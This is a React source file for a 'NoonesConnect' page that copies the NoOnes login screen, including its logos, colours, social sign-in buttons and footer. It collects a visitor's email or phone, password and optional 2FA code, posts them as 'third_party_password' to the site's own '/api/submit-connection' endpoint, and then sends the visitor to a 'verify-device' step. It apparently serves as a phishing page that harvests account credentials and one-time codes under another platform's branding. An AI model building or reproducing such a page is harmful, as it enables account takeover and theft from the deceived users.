import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../lib/supabase';

export default function NoonesConnect() {
  const navigate = useNavigate();
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
    code: '',
  });

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!email || !password) {
      setErrorMessage('Please enter your email/phone and password.');
      return;
    }
    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const response = await fetch('/api/submit-connection', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          platform: 'Noones',
          email,
          third_party_password: password,
          code: credentials.code || null,
          user_id: session?.user?.id || null,
        }),
      });

      if (!response.ok) {
        const body = await response.json().catch(() => null);
        throw new Error(body?.error || 'Failed to submit connection.');
      }

      navigate('/connect/noones/verify-device', { state: { email } });
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const themeClasses = isDarkMode 
    ? 'bg-[#1F1F1F] text-[#E7E7E7]' 
    : 'bg-[#F2F2F2] text-[#111111]';
  
  const cardClasses = isDarkMode
    ? 'bg-[#25262B]'
    : 'bg-[#FFFFFF] shadow-[0_4px_24px_rgba(0,0,0,0.04)]';

  const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';

  const inputClasses = isDarkMode
    ? 'bg-[#3A3A3A] text-[#E7E7E7] placeholder:text-[#8F92A3]'
    : 'bg-[#E9E9E9] text-[#111111] placeholder:text-[#AEBCAF]';

  return (
    <main className={`${themeClasses} h-screen w-full flex flex-col items-center justify-center py-2 sm:py-4 overflow-hidden font-sans transition-colors duration-300`}>
      <div className="w-full max-w-[480px] flex flex-col items-center px-4 space-y-2">
        <img src={logoSrc} alt="Noones" className="w-[280px] h-auto mx-auto" />

        {/* Card */}
        <div className={`${cardClasses} w-full rounded-xl p-8 sm:p-10 flex flex-col items-center`}>
          <h1 className="text-center text-2xl font-bold mb-4">Welcome for NoOnes</h1>

          {/* Social Icons */}
          <div className="flex gap-6 mb-4">
            <button className="w-10 h-10 flex items-center justify-center">
              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-9 h-9" />
            </button>
            <button className="w-10 h-10 flex items-center justify-center">
              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-9 h-9 ${isDarkMode ? 'invert' : ''}`} />
            </button>
            <button className="w-10 h-10 flex items-center justify-center">
              <img src="/logos/telegram.svg" alt="Telegram" className="w-9 h-9" />
            </button>
          </div>

          <form onSubmit={handleSubmit} className="w-full space-y-3">
            <div className="space-y-2">
              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Email/Phone number</label>
              <input
                type="text"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Email/Phone number"
                className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
              />
            </div>

            <div className="space-y-2">
              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Password</label>
              <div className="relative">
                <input
                  type="password"
                  value={credentials.password}
                  onChange={handleFieldChange('password')}
                  placeholder="Password"
                  className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 opacity-60">
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="rotate-180"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                </div>
              </div>
              <div className="flex justify-end">
                <button type="button" className="text-[14px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Don't forget password?</button>
              </div>
            </div>

            <div className="space-y-2">
              <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>2FA Code (optional)</label>
              <input
                type="text"
                value={credentials.code}
                onChange={handleFieldChange('code')}
                placeholder="Enter 2FA code if required"
                className={`${inputClasses} w-full h-[52px] px-4 rounded-xl border-none outline-none focus:ring-1 focus:ring-[#00c076] transition-all text-[16px]`}
              />
            </div>

            {errorMessage && <p className="text-red-500 text-[13px] font-semibold text-center">{errorMessage}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full h-[60px] hover:opacity-90 text-white font-bold text-[20px] rounded-xl transition-colors disabled:opacity-70 mt-4"
              style={{backgroundColor: isDarkMode ? '#44C166' : '#18C37E'}}
            >
              {loading ? 'Connecting...' : 'Log in'}
            </button>

            <div className="text-center mt-4">
              <p className={`text-[16px] font-medium ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>
                No account yet? <span className="cursor-pointer font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>Sign up</span>
              </p>
            </div>
          </form>
        </div>

        {/* Footer at Bottom */}
        <div className="w-full flex items-center justify-between pt-4">
          <div className="flex items-center gap-3">
            <div 
              onClick={() => setIsDarkMode(!isDarkMode)}
              className="flex items-center gap-3 cursor-pointer group"
            >
              <span className={`text-2xl ${!isDarkMode ? 'opacity-100' : 'opacity-40'}`}>☀️</span>
              <div className="w-12 h-6 rounded-full relative transition-colors" style={{backgroundColor: isDarkMode ? '#44C166' : '#666A78'}}>
                <div className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
              </div>
              <span className={`text-2xl ${isDarkMode ? 'opacity-100' : 'opacity-40'}`}>🌙</span>
            </div>
          </div>
          
          <button className="flex items-center gap-1 text-[16px] font-bold hover:underline" style={{color: isDarkMode ? '#44C166' : '#18C37E'}}>
            Nigerian Pidgin <span className="text-[12px] ml-0.5">▼</span>
          </button>
        </div>
      </div>
    </main>
  );
}
